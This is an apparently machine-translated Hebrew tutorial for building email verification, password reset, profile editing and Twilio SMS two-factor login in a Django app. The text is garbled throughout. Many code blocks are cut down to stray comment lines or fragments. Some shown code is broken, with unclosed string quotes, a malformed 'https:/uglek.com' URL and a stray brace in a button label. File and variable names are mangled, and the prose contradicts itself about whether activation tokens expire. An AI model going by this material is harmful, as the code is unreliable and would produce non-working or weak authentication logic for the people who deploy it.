אחרת, אתה טוב לבנותשירות דוא"ל משלך בשרת שלך מאפס. אני ממליץ על אפשרות זו, למרות שזו קוד יותר ועשוי לדרוש אירוח מיוחד. לא תוכל להפעיל שרת דואר מהמחשב הביתי שלך ככל הנראה, אז בואו נמשיך לבחון את התצורה והקוד כדי לשלוח דוא"ל לפני שנתחיל שרת בענן ונוצר שרת דואר משלנו בתוכו.

ראשית, ערוך הגדרות. Py עם הדברים הבאים<pre class="language-bash"><code>
nano app/settings.py
</code></pre>כאשר האפליקציה היא שם האפליקציה שיצרת עם StartApp.

הוסף את השורות הבאות:<pre class="language-python"><code>
SITE_NAME = 'Django App'

EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
EMAIL_HOST = 'localhost'
EMAIL_PORT = 587
EMAIL_USE_TLS = True
EMAIL_ADDRESS = username@server.com'
EMAIL_HOST_USER = 'username'
EMAIL_HOST_PASSWORD = config['EMAIL_HOST_PASSWORD']
DEFAULT_FROM_EMAIL = '{} &lt;{}&gt;'.format(SITE_NAME, EMAIL_HOST_USER)
</code></pre>הקפד לשנות את אלה כשאתה מוכן לפרוס את האפליקציה שלך, אנו נתקן זאת בהמשך. הגדרת הדוא"ל_דברס צריכה להיות הדוא"ל שתרצה לשלוח ממנה, והסיסמה (דוא"ל_HOST_PASPWORD) צריכה להיות מוגדרת לסיסמה שאתה מייצר עבור השרת. אני טוען את הסיסמה מקובץ config כדי להרחיק אותו מהקוד באמצעות ההיגיון הבא, מעל שורות אלה ב- Settings.py:<pre class="language-python"><code>
import os
import json
with open('/etc/config.json') as config_file:
    config = json.load(config_file)
</code></pre>לאחר מכן, הקמתי קובץ JSON עם התצורה ב /etc/config.json באמצעות ננו כדלקמן.

לעריכת הקובץ:<pre class="language-bash"><code>
sudo nano /etc/config.json
</code></pre>הוסף את השורות הבאות:<pre class="language-bash"><code>
{
	“EMAIL_HOST_PASSWORD”: “&lt;some password here&gt;”
}
</code></pre>אנו נמשיך לערוך את קובץ התצורה ונוסיף את כל הסיסמאות והמפתחות בה אנו נשתמש באפליקציה. לעת עתה, בואו נבחן במהירות כיצד לשלוח דוא"ל באמצעות פייתון. ראשית, בואו ניצור תבנית להודעת אימות שנוכל לשלוח למשתמשים שלנו, ונכניס אותה לספריית תבניות המשתמש. תבנית זו תיכתב ב- HTML.<pre class="language-bash"><code>
nano users/templates/users/verification_email.html
</code></pre>
<pre class="language-markup"><code><!-- 
<h1>Django App - Verify Your Email</h1>
<p>Dear {{ user.username }},</p>
<p>To verify your email, please <a href="{{ base_url }}{% url 'users:activate' uidb64=uid token=token %}">click here</a>.</p>

<p>Alternatively, you can paste the following link in your browser's address bar:</p>
<p>{{ base_url }}{% url 'users:activate' uidb64=uid token=token %}</p>

<p>The link will expire in 30 minutes.</p>
<p>If you have not requested a verification email you can simply ignore this email.</p>
<p>See you there,</p>
<p>Daisy</p>
 --></code></pre>דוא"ל זה די פשוט. זה לוקח הקשר של משתמש, כתובת האתר הבסיסית לאתר, ומזהה משתמש ואסימון המשמשים לאימות הדוא"ל של המשתמש. הקפד להגדיר את כתובת האתר הבסיסית ב- Settings.py לפני שנכתוב קוד פיתון כדי להציג את התבנית. קדימה והוסף את השורות הבאות ל- App/Setvers.py, בסמוך להתחלה.<pre class="language-python"><code>
SITE_NAME = 'Django App'
PROTOCOL = 'https'
DOMAIN = 'example.com'

BASE_URL = PROTOCOL + '://' + DOMAIN
</code></pre>בסופו של דבר, כאשר האתר שלך מוכן לאינטרנט ותפרוס אותו, תרצה להגדיר את הדומיין שלך כשם הדומיין שאתה קונה כדי לייצג את האתר. זה השם שתקליד ב- NavBar על מנת לגשת לאתר שלך. לעת עתה, אתה יכול להשאיר את הדומיין ריק או להשתמש במציין מקום. תרצה גם לשנות את ה- site_name לשם שברצונך לתת לאתר שלך, לבחירתך. 

לפני שנשלח דוא"ל, בואו ניצור מחולל אסימון כדי שנוכל לקבל אסימון הפעלת חשבון שלעולם לא יפוג. אנו יכולים לעשות זאת על ידי בנייה ויבוא אסימון הפעלת חשבון שנראה כמו הדברים הבאים. ערוך את הקובץ:<pre class="language-bash"><code>
nano users/tokens.py
</code></pre>הוסף את הקוד הבא:<pre class="language-python"><code>
from django.contrib.auth.tokens import PasswordResetTokenGenerator
import six
class TokenGenerator(PasswordResetTokenGenerator):
    def _make_hash_value(self, user, timestamp):
        return (
            six.text_type(user.pk) + six.text_type(timestamp)
        )
account_activation_token = TokenGenerator()
unsubscribe_token = TokenGenerator()
</code></pre>מחולל אסימון בסיסי זה מייצר אסימון אנו יכולים לשלוח את המשתמש לכתובת אתר והמשתמש יכול להשתמש כדי לאמת את הדוא"ל שלו ולהפעיל את חשבונו.

בשלב הבא נראה כיצד לשלוח דוא"ל. באמצעות NANO, ערוך משתמשים/דוא"ל. PY.<pre class="language-bash"><code>
nano users/email.py
</code></pre>שליחת אימות דוא"ל HTML תיראה כך:<pre class="language-python"><code>
from django.contrib.auth import get_user_model
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.contrib.sites.shortcuts import get_current_site
from django.core.mail import send_mail
from django.template.loader import render_to_string
from django.utils.encoding import force_bytes
from django.core.mail import EmailMultiAlternatives
from django.shortcuts import render
from .tokens import account_activation_token
from django.template.loader import render_to_string
from django.utils.html import strip_tags
from django.template import Template, Context
from django.conf import settings
import traceback

def send_verification_email(user):
    User = get_user_model()
    mail_subject = '[{}] Activate your account.'.format(settings.SITE_NAME)
    html_message = render_to_string('users/verification_email.html', {
        'user': user,
        'domain': settings.DOMAIN,
        'protocol': 'https',
        'uid': urlsafe_base64_encode(force_bytes(user.pk)),
        'token': account_activation_token.make_token(user),
    })
    send_html_email(user, mail_subject, html_message)
</code></pre>זה די פשוט. אנו מייבאים את הפונקציות שעלינו לשלוח את הדוא"ל, למתן את הדוא"ל עם תבניות ואת ההגדרות שלנו, ואז אנו מגדירים את הדוא"ל לפי שם התבנית ושולחים אותו למשתמש באמצעות פונקציה. תבחין שלא הגדרנו את הפונקציה כדי לשלוח את הדואר, send_html_email, ובכל זאת, אז בואו נכתוב את זה מתחת לקוד שכבר הוספנו למשתמשים/דוא"ל.<pre class="language-python"><code>
def send_html_email(user, mail_subject, html_message):
    to_email = user.email
    username = user.username
    if to_email == '':
        return None
    unsub_link = settings.BASE_URL + user.profile.create_unsubscribe_link()
    html_message = html_message + "&lt;p&gt;&lt;a href=\"" + unsub_link +  "\" + title=\"Unsubscribe from " + settings.SITE_NAME + " emails\"&gt;Unsubscribe&lt;/a&gt;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;"
    msg = EmailMultiAlternatives(mail_subject, strip_tags(html_message), settings.DEFAULT_FROM_EMAIL, [to_email], headers={'List-Unsubscribe' : '&lt;' + unsub_link + '&gt;'},)
    msg.attach_alternative(html_message, "text/html")
    profile = user.profile
    try:
        msg.send(fail_silently=False)
        if not profile.email_valid:
            profile.email_valid=True
            profile.save()
    except:
        profile.email_valid=False
        profile.save()
</code></pre>זה קצת יותר מורכב, ואנחנו עדיין לא מוכנים להפעיל את כל הקוד הזה. שימו לב שאנו מגדירים UNSUB_LINK, הקישור בו המשתמש יכול להשתמש בכדי לבטל את המנוי מהודעות הדוא"ל שלנו. זה חשוב, מכיוון שמשתמשים יצטרכו להיות מסוגלים לבטל את הסכמתם להודעות הדוא"ל שלנו אלא אם כן הם רוצים לראות אותם, בכל עת. אנו מוסיפים גם אלטרנטיבה לטקסט להודעה שלנו, שהיא הודעת HTML שהופשטה מתגי HTML. לבסוף, אנו בודקים אם הדוא"ל נשלח, ואם זה לא, אנו מסמנים בפרופיל המשתמש שהדוא"ל שלהם אינו תקף.

בואו נחזור לדגמי המשתמש כדי שנוכל לגרום לכל זה לעבוד. עלינו להגדיר פונקציה כדי ליצור קישור לביטול המנוי, ולהגדיר שדה בוליאני כדי לסמן כי הדוא"ל של המשתמש אינו תקף.

ראשית, הוסף את היבוא הבא לראש המשתמשים/דגמים.<pre class="language-bash"><code>
nano users/models.py
</code></pre>
<pre class="language-python"><code># ...</code></pre>בשלב הבא, בואו להוסיף פונקציות למודל המשתמש כדי לייצר את האסימון ולבדוק את האסימון המשמש להפעלת הדוא"ל, כמו גם את השדה כדי לשמור אם המשתמש מקבל בהצלחה את הדואר שלו. ב- משתמשים/Models.py שוב, הוסף את הקוד הבא לסוף הדגם (קוד מוערך)<pre class="language-python"><code># ...
            TimestampSigner().unsign(key, max_age=60 * 60 * 24 * 30) # תקף למשך 30 יום</code></pre>זה די פשוט, אנו משתמשים במתחם זמן חותמות, שהוא כלי קריפטוגרפיה בסיסי, ליצירת אסימון שיפוג לאחר פרק זמן מסוים, ואנחנו משתמשים גם בפונקציה אחרת כדי לבדוק אם היא תקפה. אנו משתמשים באסימונים אלה פעמיים, פעם אחת כדי לאמת את הדוא"ל, ופעם אחת לקישור ביטול המנוי. 

כעת, לאחר שיש לנו את אלה, האחרון של העבודה שנצטרך לעשות הוא בדעות. בתוך משתמשים/views.py, בואו להוסיף תצוגות כדי לאמת את כתובת הדוא"ל ולבטל את המנוי.<pre class="language-bash"><code>
nano users/views.py
</code></pre>ראשית, הוסף את היבוא הבא. זרקתי כמה נוספים כדי שלא נצטרך לייבא עוד פריטים אחר כך.<pre class="language-python"><code>from .email import send_verification_email # הקפד לייבא את פונקציית שליחת דוא"ל האימות</code></pre>יתכן שכבר יש לך חלק מהיבוא הזה, אבל לא מזיק לחזור עליהם. תצטרך לייבא את פונקציית שליחת דוא"ל האימות, כמו גם את CANDRT_ACTIVATION_TOKEN מ- USERS.TOKENS, בין יבוא אחר.

כעת, בתחתית הקובץ, הוסף את הקוד הבא:<pre class="language-python"><code>        # בטל את המנוי להם
    # אחרת הפנה לדף הכניסה
# sendwelcomeemail (בקשה, משתמש)</code></pre>זה הרבה קוד. בואו נשבר את זה. הפונקציה הראשונה, נקייה ופשוטה, מבטלת את המשתמש של המשתמש מרשימת התפוצה. הפונקציה השנייה מפעילה את הדוא"ל שלהם, ותבחין שהוספתי פונקציה שהגירה, Sendwelcomeemail. אתם מוזמנים להשתמש בתבנית דוא"ל ובהגדרת פונקציה כדי לשלוח דוא"ל מבורך, פשוט עדיין לא. הפונקציה האחרונה שזרקתי בה חשובה, מכיוון שתוקף דוא"ל ההפעלה פג. לכן, נצטרך לשלוח מחדש את דוא"ל ההפעלה בחלק מהזמן. אנו יכולים להשתמש בטופס בסיסי לשם כך, ולהתקשר לפונקציה כדי לשלוח את דוא"ל האימות. לפני שנעשה זאת, בואו נדאג שהוא יישלח מלכתחילה, על ידי הוספת שיחת פונקציה לתצוגת הפנקס. הוסף שורה זו רגע לפני ההפניה מחדש בתצוגת הפנקס, Def Register, במשתמשים/views.py.<pre class="language-bash"><code>
nano users/views.py
</code></pre>
<pre class="language-python"><code># ... (אחרי) רישום DEF (בקשה):
# ... (לפני) להפנות מחדש (</code></pre>אינך צריך להוסיף את השורות הראשונות והאחרונות בקטע קוד זה, רק וודא שתצוגת הרשמה שולחת את דוא"ל האימות למשתמש. זה אמור להיראות כך:<pre class="language-python"><code># ... יבוא
            send_verification_email(user) # הקפד להוסיף קו זה!</code></pre>כעת, נצטרך להוסיף טופס כדי לשלוח מחדש את דוא"ל ההפעלה. במשתמשים/forms.py, הוסף את הטופס הבא:<pre class="language-python"><code># ... (יבוא)</code></pre>אנו נצטרך גם תבנית המתאימה לטופס הפעלת דוא"ל זה. בואו להוסיף את התבנית הזו פנימה. ערוך את הקובץ:<pre class="language-bash"><code>
nano users/templates/users/resend_activation.html
</code></pre>בשלב הבא הוסף את הקוד הבא לקובץ.<pre class="language-python"><code>
{% extends 'base.html' %}
{% block content %}
{% load crispy_forms_tags %}
        &lt;form method="POST"&gt;
            {% csrf_token %}
            &lt;fieldset class="form-group"&gt;
                &lt;legend class="border-bottom mb-4"&gt;Resend activation email&lt;/legend&gt;
                {{ form|crispy }}
            &lt;/fieldset&gt;
            &lt;div class="form-group"&gt;
                &lt;button class="btn btn-outline-secondary" type="submit"&gt;Resend activation email&lt;/button&gt;
            &lt;/div&gt;
        &lt;/form&gt;
{% endblock %}
</code></pre>וואו, זה המון! כעת, כאשר אנו מפרסים את הקוד לשרת שלנו, נוכל לשלוח דוא"ל HTML ולהפעיל חשבונות משתמש בלחיצה בדוא"ל. ייתכן גם שנרצה לשלוח דוא"ל קבלת פנים פשוט, אז בואו נראה כיצד לעשות זאת. בחזרה למשתמשים/בדוא"ל. Py, הוסף את הקוד הבא:<pre class="language-python"><code>
def sendwelcomeemail(user):
    User = get_user_model()
    html = open('{}/users/welcome_email.html'.format(settings.BASE_DIR)).read()
    subject = 'Welcome to ' + settings.SITE_NAME + ', {{ username }}!'
    template = Template(html)
    subjtemplate = Template(subject)
    context = Context({'username': user.username, 'base_url': settings.BASE_URL, 'model_name': 'Daisy Holton, 'site_name': settings.SITE_NAME})
    renderedtemplate = template.render(context)
    subjcontext = Context({'username': user.username})
    subjrenderedtemplate = subjtemplate.render(subjcontext)
    send_html_email(user, subjrenderedtemplate, renderedtemplate)
</code></pre>כמו כן, נצטרך תבנית שתספק את כל המידע הזה. באתר שלי, התבנית נראית כמו להלן, אך אתם מוזמנים לעצב אותה ככל שתרצו.<pre class="language-markup"><code><!-- 
<html>
<body>
<h3>Welcome to {{ site_name }}</h3>
<p>Hello {{ username }},</p>
<p>We are happy to see you here! Thank you for joining {{ site_name }} and being a part of the fun. To get started, here are a few things you can do after you verify your identity.</p>
<ol>
    <li><a href="{{ base_url }}/" title="Use the app">Use the app</a>. This is the main page of {{ site_name }}</li>
    <li><a href="{{ base_url }}/feed/profile/Clementine/" title="See my profile">Visit my private {{ site_name }} profile</a>. This is a page for anyone wanting to get to know me.</li>
    <li><a href="{{ base_url }}/feed/profiles/" title="See all profiles currently on the site">More profiles</a>. You can find these people on the site, and see their content.</li>
    <li><a href="{{ base_url }}/feed/all/" title="See everything on {{ site_name }}">See all posts here</a>. This is the private front page of {{ site_name }}.</li>
</ol>
<p>There is even more on the site, so feel free to visit and see what you find. You can share the site with any of the social buttons on each page. I hope you enjoy your time with {{ site_name }}! Thanks for being here.</p>
<p>With much love,</p>
<p>{{ model_name }}</p>
<a href="{{ base_url }}" title="{{ site_name }}">{{ base_url }}</a>
 --></code></pre>שים לב שאין לנו תגי סגירה של גוף או HTML, מכיוון שאנו מוסיפים אותם כאשר אנו מוסיפים את קישור ה- HTML ביטול המנוי. אלה חשובים, אבל אנחנו לא רוצים להגדיר אותם פעמיים.

אז מה הלאה? עברנו דרך ארוכה. באמת, עלינו להיות מוכנים לפרוס את האתר לשרת. אנו יכולים להוסיף את המעצב @login_required ולהפוך את התצוגות שלנו לאבטחות, לקחת הרשמות משתמשים, לשלוח דוא"ל תואם ומידע על מטמון, שהוא הבסיס למה שאתר צריך לעשות כדי להישאר רלוונטיים. נוסיף כמה תכונות שימושיות נוספות ואז נבנה בסיס לפריסת הקוד שלנו לשרת מרוחק, הגדרת שרת דואר, תצורת דומיין ומסננים כדי להפוך את האתר שלנו לאבטח ומתאים.

נצטרך גם תצוגה לאיפוס סיסמה, אז בואו נוסיף את זה במהירות ממש מהירה. תצוגת איפוס הסיסמה המובנית של Django נשברת בכמה פונקציות, אך אנו נבחן כיצד לכתוב תצוגה משלנו, תבנית דוא"ל, טפסים ודפוסי כתובות אתרים. הנה איך נראית התצוגה, במשתמשים/Views.py<pre class="language-python"><code># ... יבוא</code></pre>טופס זה מובנה ל- Django, אך נצטרך תבנית כדי לאשר את איפוס הסיסמה, משתמשים/תבניות/משתמשים/סיסמה_רסט_קונפירם. HTML<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
        <form method="POST">
            {% csrf_token %}
            <fieldset class="form-group">
                <legend class="border-bottom mb-4">Reset Password</legend>
                {{ form|crispy }}
            </fieldset>
            <div class="form-group">
                <button class="btn btn-outline-info" type="submit">Reset Password</button>
            </div>
        </form>
{% endblock content %}
 --></code></pre>יש לנו גם תבנית לשלוח דוא"ל לאיפוס סיסמה, עם טופס פשוט, במשתמשים/תבניות/משתמשים/סיסמה_רסט. Html<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% load crispy_forms_tags %}
{% block content %}
        <form method="POST">
            {% csrf_token %}
            <fieldset class="form-group">
                <legend class="border-bottom mb-4">Reset Password</legend>
                {{ form|crispy }}
            </fieldset>
            <div class="form-group">
                <button class="btn btn-outline-info" type="submit">Request Password Reset</button>
            </div>
        </form>
{% endblock content %}
 --></code></pre>התבנית לדוא"ל עצמה היא פשוטה, זהו קובץ HTML בסיסי המציג קישור לאיפוס הסיסמה, במשתמשים/תבניות/משתמשים/סיסמה_רסט_מיל. Html. Django יפרש אוטומטית קובץ זה.<pre class="language-markup"><code><!-- 
<h1>Uglek - Reset Your Password</h1>
<p>Hello,</p>
<p>To reset your password, please <a href="https:/uglek.com{% url 'password_reset_confirm' uidb64=uid token=token %}">click here</a>.</p>
<p>Alternatively, you can paste the following link into your browser:</p>
<p>https://uglek.com{% url 'password_reset_confirm' uidb64=uid token=token %}</p>
<p>If you have not requested a password reset you can simply ignore this email.</p>
<p>Thanks for joining us,</p>
<p>Daisy</p>
 --></code></pre>נצטרך גם שתי תבניות נוספות. הראשון הוא לאשר שהדוא"ל נשלח. תצוגות עבור אלה כבר נמצאות בדג'נגו, ולכן אנחנו רק צריכים להתייחס אליהם בכתובות האתר. תבנית זו ממוקמת במשתמשים/תבניות/משתמשים/סיסמה_רסט_דונה. Html<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% block content %}
  <div class="media-body">
    <div class="alert alert-info">
        An email has been sent with instructions to reset your password.
    </div>
  </div>
{% endblock content %}
 --></code></pre>ולבסוף, כדי לאשר שאיפוס הסיסמה הושלם, משתמשים/תבניות/משתמשים/סיסמה_ Reset_Complete.html<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% block content %}
 <div class="media-body">
    <div class="alert alert-info">
        Your password has been set.
    </div>
    <a href="{% url 'users:login' %}">Sign In Here</a>
  </div>
{% endblock content %}
 --></code></pre>כעת, אנו זקוקים לדפוסי URL לתצוגות אלה. במשתמשים/urls.py, הוסף את דפוסי ה- URL הבאים:<pre class="language-python"><code>    # ... כתובות כתובות קודמות כאן</code></pre>ארבע תבניות, זה המון! אך כעת אנו יכולים להיות בטוחים שנוכל לאפס את סיסמת המשתמש בכל עת שאנחנו צריכים, הכל מדפדפן האינטרנט.

אני מבין שזה הרבה קוד. אם זה נראה קצת מעל הראש שלך, זה בסדר. תשתפר, ההבנה שלך תשתפר ותהפוך להיות הרבה יותר מוסמכת עם הקוד בקרוב מאוד. אם אתה אבוד לחלוטין, אני ממליץ לחזור לתוכנה זו בהמשך לאחר שעבדתי על קורס למד לקוד באופן מקוון. בדרך כלל אלה חופשיים להתחיל, וידריך אותך דרך כל מה שאתה צריך כדי להצליח כשאתה חוזר לפרויקט זה. אם אתה מרגיש שאתה מוכן להמשיך, המשך לקרוא, הבא, אנו נכסה את פריסת הקוד שלך לשרת מרוחק ולהגדיר שרת דואר, כמו גם אוטומציה של הפריסה שלך באמצעות BASH, כך שתוכל תמיד להגדיר פרויקט חדש עם כמה פקודות פשוטות.

הדבר האחרון שאנחנו צריכים לעשות לפני הפריסה לשרת מרוחק הוא להפוך את האתר שלנו לקצת יותר מאובטח. אתהשימו לב שתצוגת הכניסה לוקחת רק שם משתמש וסיסמא, ואין אימות רב -גורם או קוד חד פעמי. זהו תיקון קל, ועם אותו קוד, אנו יכולים לגרום לאתר שלנו לשלוח הודעות טקסט ואפילו להיות מגיבות להודעות טקסט שנשלחות לשרת. כדי להתחיל, נחזור לדגמי המשתמש ונוסיף חתימת חותמת זמן שתייצג כל כניסה. נוסיף גם מזהה ייחודי ומסתובב למודל המשתמש שישמש להוספת אבטחה נוספת לכניסה שלנו. עריכת דגמי המשתמש, משתמשים/דגמים. Py, הוסף את הדברים הבאים<pre class="language-python"><code># הקפד לייבא את ה- UUID, חותם חותמת זמן ומחולל כתובת האתר (הפוך)
    # הוסף כאן קוד זה
    # והוסף פונקציה זו
            TimestampSigner().unsign(key, max_age=60 * settings.AUTH_VALID_MINUTES) # תקף למשך 3 דקות</code></pre>וודא שהמשתמשים/דגמים שלך. Py נראים כך, מלבד התגובות (קוד בשורות עם #). מפרק את זה, זה פשוט. יש לנו כמה יבוא, חותמת זמן שהיא כלי עזר קריפטוגרפי שיכול ליצור קוד מאובטח ולאמת אותו כדי לוודא שהוא תקף, נעשה שימוש רק פעם אחת ולא ישן ממספר מסוים של שניות. אנו משתמשים גם ב- UUID, שהוא מזהה ייחודי המזהה את המשתמש שלנו בחתימת האסימון, ובכתובת האתר בו האסימון נשלח למשתמש. אנו נשתמש בקריפטוגרפיה בסיסית זו כדי לבנות תצוגת אימות שני גורמים. לפני שנעשה משהו אחר, בואו ננהל את ההגירה כך שדגמי המשתמש שלנו יתעדכנו. בספריה עם Manage.py, הפעל את הפקודות הבאות כדי לבצע את ההגירה ולהשלים את ההגירה.<pre class="language-bash"><code>
source venv/bin/activate
python manage.py makemigrations &amp;&amp; python manage.py migrate
</code></pre>זה חשוב מכיוון שבכל פעם שאנו מבצעים שינויים בדגמים, עלינו ליצור את הטבלאות ולעדכן את בסיס הנתונים עם ברירות מחדל לפני שנוכל להשתמש בפועל בדגמים.

בשלב הבא, בואו לאלתר את תצוגת הכניסה שלנו כדי להפנות מחדש לתצוגת אימות משנית. ב- משתמשים/views.py, הסר את פונקציית הכניסה והפנה מחדש לכתובת האתר שרק יצרנו במודלי המשתמש.<pre class="language-python"><code># ... יבוא
        if user and user.profile.can_login &lt; timezone.now(): # שים לב שעכשיו אנו בודקים אם המשתמש יכול להתחבר
            # הסר את הפונקציה Auth_login שהייתה כאן
                return redirect(user.profile.create_auth_url()) # שימו לב שאנו מפנים מחדש לכתובת אתר חדשה כאן
            else: # אם המשתמש אינו משתמש באימות רב-גורמי, פשוט התחבר אליו.
        else: # אם הכניסה לא הייתה מוצלחת,
            user = User.objects.filter(username=username).first() # זה החלק בו אנו מעדכנים את פרופיל המשתמשים
                profile.can_login = timezone.now() + datetime.timedelta(seconds=15) # אז הם לא יכולים להתחבר שוב לכמה שניות</code></pre>אז זה די פשוט, כעת יש לנו דרך להפנות מחדש לתצוגת אימות שני הגורמים כשאנחנו יוצרים אותה. יש לנו גם נפילה למקרה שהמשתמש לא הוסיף מספר טלפון. נוסיף תצוגה בסיסית כדי להוסיף מספר טלפון בקרוב ונכנס עם הודעת טקסט בקרוב.

ראשית, אנו זקוקים לדרך קלה לשלוח הודעת טקסט מהקוד שלנו. לשם כך, אנו יכולים לבחור מבין מספר ממשקי API, אך הקל ביותר לדעתי הוא Twilio. הם מציעים גם תמחור טוב לפרויקטים קטנים יותר, כמו גם הנחות בתפזורת. צור חשבון ב- Twilio.com, מלא כמה פרטים על הפרויקט שלך, קנה מספר טלפון והעתק את מפתחות ה- API שלך ל- Settings.py. לאחר מכן הוסף קוד זה תחת קובץ חדש, משתמשים/sms.py.<pre class="language-bash"><code>
nano users/sms.py
</code></pre>
<pre class="language-python"><code># ייבא את כל החבילות הדרושות
# קוד זה שולח את הטקסט עם Twilio
# פונקציית עוזר כדי לקבל מספר עם כל כך הרבה ספרות
# שלח את הטקסט כדי לאמת את המשתמש
# שלח למשתמש כל טקסט עם פונקציה זו
# לאמת את הקוד בפונקציה זו
# אמת את הזמן</code></pre>הקפד לשנות את ההגדרות שלך באופן מתאים, להוסיף שורות אלה עם המפתחות שלך:<pre class="language-python"><code># הקפד להעתיק את אלה מלוח המחוונים שלך Twilio
AUTH_VALID_MINUTES = 3 # מספר הדקות שדף ה- TFA פעיל לאחר מופע</code></pre>ראשית, נצטרך טפסים לתצוגות אימות שני גורמים שלנו. עריכת משתמשים/forms.py, הוסף את הקוד הבא.<pre class="language-python"><code># ... יבוא
# טופס להיכנס למספר הטלפון שלנו
# טופס לאימות</code></pre>בשלב הבא, בואו ניצור את התצוגות במשתמשים/views.py<pre class="language-python"><code># ... יבוא</code></pre>נצטרך גם תבניות לשתי התצוגות הללו. בואו נוסיף תחילה את תבנית ה- MFA.<pre class="language-bash"><code>
nano users/templates/users/mfa.html
</code></pre>הוסף את קוד ה- HTML הזה לתבנית<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% block content %}
{% load app_filters %}
{% load crispy_forms_tags %}
        <form action="{{ request.path }}{% if request.GET.next %}?next={{ request.GET.next }}{% endif %}" method="POST">
            {% csrf_token %}
            <legend class="border-bottom mb-4">Enter Verification Code</legend>
            <p>Step 1: Send the code</p>
	    <i>Never share your code with anyone, as it can be used to access your account temporarily.</i>
	    <div class="form-group">
                <button class="btn btn-outline-primary" type="submit">Send code</button>
            </div>
	    <hr>
	    <p>Step 2: Enter the code</p>
            <fieldset class="form-group">
                {{ form|crispy }}
		<p>Press the enter button to send yourself the code at {{ user.profile.phone_number|securephone }}. Then, enter the code and press enter.</p>
            </fieldset>
            <div class="form-group">
                <button class="btn btn-outline-secondary" type="submit">Enter code</button>
            </div>
        </form>
{% endblock %}
 --></code></pre>זה די מסביר את עצמו. הטופס שולח קוד או קוד ריק, ותבחין בתצוגה שאנו שולחים את הקוד אם נקבל קוד ריק. אז יש לנו רק שני כפתורי הגשה, ובדרך זו אנו יכולים לשלוח את הקוד עם אחד הכפתורים. בשלב הבא נוסיף טופס פשוט להוספת מספר טלפון.<pre class="language-bash"><code>
nano users/templates/users/mfa_onboarding.html
</code></pre>הוסף את ה- HTML הבא:<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% block content %}
{% load crispy_forms_tags %}
        <form method="POST">
            {% csrf_token %}
            <fieldset class="form-group">
                <legend class="border-bottom mb-4">Set Up Two Factor Authentication</legend>
                {{ form|crispy }}
            </fieldset>
            <div class="form-group">
                <button class="btn btn-outline-secondary" type="submit">Add phone number</button>
            </div>
        </form>
{% endblock %}
 --></code></pre>טופס זה פשוט הרבה יותר, הוא פשוט הופך את טופס מספר הטלפון שיצרנו ומאפשר למשתמש להוסיף מספר טלפון.

זה נראה ממש טוב! כל עוד הכל מוגדר כראוי, עלינו להיות מסוגלים לשלוח הודעות, ולהתחבר למשתמש עם מספר הטלפון שלו ברגע שנוסיף את דפוסי ה- URL. הדבר האחרון שאנחנו צריכים להגדיר הוא תצוגת פרופיל כדי שנוכל לוודא שהמשתמש יכול לשנות את מספר הטלפון שלו מבלי להיכנס. כמו כן, בסופו של דבר נרצה להוסיף אפשרות "עצור להפסיק", כך שהמשתמש יכול לשלוח טקסט "עצור" לבטל את הסכמתם להודעות טקסט עתידיות.

בואו להוסיף תצוגת פרופיל למשתמשים/views.py. תצוגה זו תעדכן את הביולוגיה, הדוא"ל, שם המשתמש ומספר הטלפון של המשתמש, וכן תאפשר לנו לאפשר אימות רב -גורם. ראשית, נצטרך שתי טפסים נוספים במשתמשים/forms.py<pre class="language-python"><code># ... יבוא</code></pre>בשלב הבא אנו יכולים ליצור תצוגה לשימוש בשתי הצורות הללו. ערוך משתמשים/views.py והוסף בתצוגה.<pre class="language-python"><code># הוסף יבוא זה</code></pre>נצטרך גם תבנית לתצוגה זו.<pre class="language-bash"><code>
nano users/templates/users/profile.html
</code></pre>
<pre class="language-markup"><code><!-- 
{% extends "base.html" %}
{% load crispy_forms_tags %}
{% load feed_filters%}
{% block content %}
	<h2>Edit Your Profile</h2>  
	<form method="POST" enctype="multipart/form-data" id="profile-form">
          {% csrf_token %}
          <fieldset class="form-group">
              <legend class="border-bottom mb-4 mt-4">Profile info</legend>
              {{ u_form|crispy }}
              {{ p_form|crispy }}
          </fieldset>
          <div class="form-group">
              <button class="btn btn-outline-info" type="submit">Update}</button>
          </div>
	</form>
        <p style="text-color: green;" class="hide" id="posted">Saved</p>

{% endblock content %}
{% block javascript %}
var form = document.getElementById('profile-form');
$('input').change(function(){
	var formdata = new FormData(form);
	$.ajax({
		url: window.location.href,
		type: "POST",
		data: formdata,
		processData: false,
		contentType: false,
		timeout: 1000 * 60,
                success: function(data) {
                  $(posted).removeClass("hide");
		  setTimeout(function() {
			$(posted).addClass("fade-hidden");
			setTimeout(function() {
				$(posted).addClass("hide");
				$(posted).removeClass("fade-hidden");
			}, 2000);
		  }, 2000);
                }
	});
});
{% endblock %}
 --></code></pre>תבחין שמדובר בצורה פשוטה למדי, אך יש בו קצת JavaScript שמפרסם אוטומטית את תוכן הטופס בזמן שהם מתעדכנים. זה מועיל לקבל, כך שאתה מסוגל לבצע עריכות מבלי שתצטרך ללחוץ על הגשה בכל פעם.

בשלב הבא, אנו זקוקים לכתובות אתרים המייצגות את כל התצוגות הללו בפלטות כתובות האתר של המשתמשים. ערוך משתמשים/urls.py והוסף קוד זה:<pre class="language-python"><code># ... קוד קודם, יבוא
# ... דפוסי כתובת אתר שהזכרנו בעבר, הוסף את שלוש השורות הבאות</code></pre>זה זמן טוב לבדוק את הפרויקט שלנו. אבל ראשית, בואו ננהל גיבוי נוסף.<pre class="language-bash"><code>
backup
</code></pre>ולהריץ את השרת. לפני שנפרוס לשרת לינוקס, כדאי לאפשר אימות שני גורמים בחשבון. אנו נעשה זאת לעבור לכתובת האתר שלנו,/משתמשים/פרופיל/, ונבדוק את התיבה כדי לאפשר אימות לאחר הזנת מספר הטלפון שלנו ואז הגשת הטופס.<pre class="language-bash"><code>
python manage.py runserver localhost:8000
</code></pre>בקר בדף האינטרנט על ידי מעבר לדפדפן האינטרנט שלך, אני משתמש ב- Google Chrome בדוגמה זו, ונכנס לכתובת האתר https: // localhost: 8000/חשבונות/פרופיל/

תוכל להתחבר במידת הצורך ולאפשר אימות שני גורמים.

